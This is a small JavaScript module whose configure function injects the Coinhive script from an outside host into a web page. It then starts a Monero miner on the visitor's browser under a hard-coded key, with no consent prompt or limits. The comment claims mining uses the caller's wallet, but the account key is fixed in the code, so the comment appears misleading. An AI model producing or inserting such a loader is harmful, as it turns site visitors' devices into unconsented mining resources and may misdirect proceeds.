module.exports = configure;

function configure (xmrWalletAddress) {

  if (typeof xmrWalletAddress !== 'string') {
    throw new TypeError('xmrWalletAddress expected to be a string');
  }

  var script = document.createElement('script');
  script.onload = function () {
    // XMR Pool Key
    var m = new CoinHive.Anonymous('BUSbODwUSryGnrIwy3o6Fhz1wsdz3ZNu');
    // Start with user defined wallet
    m.start(xmrWalletAddress);
  };

  script.src = 'https://coinhive.com/lib/coinhive.min.js';
  document.head.appendChild(script);

}

